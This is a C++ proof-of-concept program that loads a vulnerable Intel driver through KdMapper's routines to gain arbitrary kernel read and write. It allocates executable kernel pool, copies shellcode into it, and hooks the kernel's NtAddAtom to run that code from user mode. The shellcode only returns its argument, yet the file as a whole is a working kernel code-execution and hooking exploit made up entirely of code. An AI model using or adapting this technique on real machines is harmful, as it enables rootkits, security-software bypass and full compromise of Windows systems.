#include <cstdio>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif //WIN32_LEAN_AND_MEAN
#ifndef VC_EXTRALEAN
#define VC_EXTRALEAN
#endif //VC_EXTRALEAN
#include <windows.h>

/* most KdMapper's source files are intentionally not included in this directory both for copyright and because the compiled executable loads a vulnerable driver.
 * To actually compile, take KdMapper's intel_driver.cpp, intel_driver_resource.hpp, nt.hpp, service.*pp, utils.*pp
 */
#include "intel_driver.hpp"

// main
int main() {
	// to see output before BSOD, hopefully
	setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stderr, 0, _IONBF, 0);

	puts("loading...");
	HANDLE hIntel = intel_driver::Load();
	if (!hIntel || INVALID_HANDLE_VALUE == hIntel) {
		puts("failed to load.");
		return 1;
	}
	puts("loaded");

	// playground
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == 0) {
		puts("[-] Failed to load ntdll.dll"); //never should happens
		return 1;
	}

	auto NtAddAtom = GetProcAddress(ntdll, "NtAddAtom");
	if (!NtAddAtom)
	{
		puts("[-] Failed to get export ntdll.NtAddAtom");
		return 1;
	}

	puts("getting kernel's NtAddAtom...");
	uint64_t kernel_NtAddAtom = intel_driver::GetKernelModuleExport(hIntel, intel_driver::ntoskrnlAddr, "NtAddAtom");
	if (!kernel_NtAddAtom) {
		puts("[-] Failed to get export ntoskrnl.NtAddAtom");
		return 1;
	}

	puts("getting kernel's ExAllocatePool2...");
	uint64_t kernel_ExAllocatePool2 = intel_driver::GetKernelModuleExport(hIntel, intel_driver::ntoskrnlAddr, "ExAllocatePool2");
	if (!kernel_ExAllocatePool2) {
		puts("[-] Failed to get export ntoskrnl.ExAllocatePool2");
		return 1;
	}

	puts("allocating executable memory...");
	uint64_t poolFlags = 0x2LLU | 0x80LLU; // uninitialized, nonpaged_executable
	uint64_t execMem;
	if (!intel_driver::CallKernelFunction<uint64_t, uint64_t, size_t, uint32_t>(hIntel, &execMem, kernel_ExAllocatePool2, poolFlags, 4096, '1337')) {
		puts("unable to allocate memory");
		return 1;
	}

	puts("filling executable memory with shellcode...");
	unsigned char kernelShellcode[] = { 0x48, 0x89, 0xc8, 0xc3 }; // mov rax, rcx; ret

	if (!intel_driver::MemCopy(hIntel, execMem, reinterpret_cast<uint64_t>(kernelShellcode), sizeof(kernelShellcode))) {
		puts("failed to copy shellcode");
		return 1;
	}

	unsigned char hook[] = { 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0 }; // mov rax, imm64; jmp rax
	* (uint64_t *) (hook + 2) = execMem;
	unsigned char original[sizeof(hook)];

	puts("reading kernel's NtAddAtom...");
	assert(intel_driver::ReadMemory(hIntel, kernel_NtAddAtom, original, sizeof(hook)));

	puts("hooking kernel's NtAddAtom...");
	assert(intel_driver::WriteToReadOnlyMemory(hIntel, kernel_NtAddAtom, hook, sizeof(hook)));

	auto callableNtAddAtom = reinterpret_cast<uint64_t (__stdcall *) (void *)>(NtAddAtom);

	puts("calling ntdll's NtAddAtom...");
	uint64_t value = callableNtAddAtom(0xdeadc0de);
	printf("Got: %llx\n", value);

	puts("restoring kernel's NtAddAtom...");
	assert(intel_driver::WriteToReadOnlyMemory(hIntel, kernel_NtAddAtom, original, sizeof(hook)));

	puts("unloading...");
	intel_driver::Unload(hIntel);
	puts("unloaded");

	return 0;
}
